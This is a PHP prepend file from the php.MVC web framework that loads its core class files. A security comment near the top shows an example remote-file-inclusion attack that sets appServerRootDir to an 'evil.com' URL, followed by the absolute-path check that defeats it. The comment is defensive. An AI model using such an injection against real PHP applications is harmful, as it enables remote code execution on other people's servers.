<?php
/*
* $Header: /PHPMVC/phpmvc-base/WEB-INF/GlobalPrependEx_Perform.php,v 1.2 2006/02/22 08:12:49 who Exp $
* $Revision: 1.2 $
* $Date: 2006/02/22 08:12:49 $
*
* ====================================================================
*
* License:	GNU Lesser General Public License (LGPL)
*
* Copyright (c) 2006 John C.Wildenauer.  All rights reserved.
*
* This file is part of the php.MVC Web applications framework
*
* This library is free software; you can redistribute it and/or
* modify it under the terms of the GNU Lesser General Public
* License as published by the Free Software Foundation; either
* version 2.1 of the License, or (at your option) any later version.

* This library is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* Lesser General Public License for more details.

* You should have received a copy of the GNU Lesser General Public
* License along with this library; if not, write to the Free Software
* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

///// SECURITY PRE-CHECK
// Security Note: PHP manual :: Include()
// If "URL fopen wrappers" are enabled in PHP you can specify the file to be included 
// using a URL (via HTTP ...) instead of a local pathname.
// ...
// This is not strictly speaking the same thing as including the file and having it 
// inherit the parent file's variable scope; the script is actually being run on the 
// remote server and the result is then being included into the local script. 
//
// Note: Evil hacker can try to inject the AppServer path like this:
// $globalPrependFiles	= 
//		$appServerRootDir
//			."/WEB-INF/globalPrependEx.php?appServerRootDir=http://evil.com/phpmvc-base-evil";
// include_once $globalPrependFiles;
//
// But we catch him with the absolute-path test:
// Check if the specified system path is an absolute path. Absolute system
// paths start with a "/" on Unix, and "Ch\:" or "Ch/:" on Win 32.
// Eg: "/Some/Unix/Path/" or "D:\Some\Win\Path" or "D:/Some/Win/Path".
$fAbsolutePath = NULL;
$fAbsolutePath = ClassPath::absolutePath($appServerRootDir);
if($fAbsolutePath == False) {
	// RED-ALERT
	// Kill this process now
	print "<b>ALERT: The AppServer path is not valid. Aborting ...</b><br>";
	exit;
}

// REQUIRED BASE CLASS FILES

include_once $appServerRootDir.'/WEB-INF/lib/logging/PhpMVC_Log.php';	// Class Log is depreciated. Use class PhpMVC_Log instead.
#include_once $appServerRootDir.'/WEB-INF/lib/logging/Log.php';			// Loading Log class only for legacy applications

include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/ActionDispatcher.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/FileUtils.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/BootUtils.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/HelperUtils.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/PhpBeanUtils.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/RequestUtils.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/Format.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/MessageFormat.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/Locale.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/MessageResources.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/PropertyMessageResources.php';

include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/connector/HttpAppServer.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/connector/RequestBase.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/connector/HttpRequestBase.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/connector/ResponseBase.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/connector/HttpResponseBase.php';

include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/action/Action.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/action/ActionForm.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/action/ActionServer.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/action/RequestProcessor.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/action/ActionMessage.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/action/ActionError.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/action/ActionMessages.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/action/ActionErrors.php';

#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/actions/ForwardAction.php';
#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/actions/DispatchAction.php';
#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/actions/LookupDispatchAction.php';

include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/appserver/AppServerConfig.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/appserver/AppServerContext.php';

include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/config/ActionConfig.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/config/ControllerConfig.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/config/ForwardConfig.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/config/FormBeanConfig.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/config/ViewResourcesConfig.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/config/ApplicationConfig.php';
include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/config/DataSourceConfig.php';


// OPTIONAL CLASS FILES (Include as required)
// For best performance comment-out unused class files.

// PEAR
// Comment out the PEAR includes if you are using external PEAR libraries
#include_once $appServerRootDir.'/WEB-INF/lib/pear/DB/mysql.php';
#include_once $appServerRootDir.'/WEB-INF/lib/pear/DB/mssql.php';
#include_once $appServerRootDir.'/WEB-INF/lib/pear/DB.php';
#include_once $appServerRootDir.'/WEB-INF/lib/pear/PEAR.php';
#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/dbcp/PearMysqlDataSource.php';
#include_once $appServerRootDir.'/WEB-INF/lib/pear/HTTP_Upload/Upload.php'; 

// ADODB
// Comment out the ADODB includes if you are using external ADODB libraries
#include_once $appServerRootDir.'/WEB-INF/lib/adodb/adodb.inc.php';
#include_once $appServerRootDir.'/WEB-INF/lib/adodb/drivers/adodb-mysqlt.inc.php';
#include_once $appServerRootDir.'/WEB-INF/lib/adodb/drivers/adodb-access.inc.php';
#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/dbcp/AdodbDataSource.php';

// PlugIns
#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/plugins/APlugIn.php';
#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/plugins/SmartyPlugInDriver.php';
#include_once $appServerRootDir.'/WEB-INF/lib/smarty/Smarty.class.php';

// File Uploading
#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/upload/UploadedFile.php';
#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/upload/MultiPartUploadFileHandler.php';

// php.MVC Tags
#include_once $appServerRootDir.'/WEB-INF/lib/phpmvc_tags/PhpMVC_Tags.php';
#include_once $appServerRootDir.'/WEB-INF/lib/phpmvc_tags/TagManager.php';
#include_once $appServerRootDir.'/WEB-INF/classes/phpmvc/utils/TagActionDispatcher.php';

// We can check if ConfigRuleSet has been loaded in our ".../module/WEB-INF/prepend.php"
define('CONFIGRULESET', "1");

?>